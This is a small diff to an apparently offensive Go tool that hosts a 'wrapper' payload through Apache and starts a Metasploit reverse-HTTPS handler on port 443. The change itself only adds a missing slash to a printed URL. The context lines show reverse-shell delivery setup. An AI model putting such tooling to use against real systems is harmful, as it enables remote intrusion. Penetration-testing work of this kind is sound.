@@ -92,7 +92,7 @@ func main() {
 	ip := resolvehostip()
 	wrapper(ip)
 	startapache()
-	fmt.Println("Wrapper Hosted in : http://" + ip + os.Args[5])
+	fmt.Println("Wrapper Hosted in : http://" + ip + "/" + os.Args[5])
 
 	createresourcefile("revhttps", ip, "443")
 	startmsf("/root/msfr.rc")
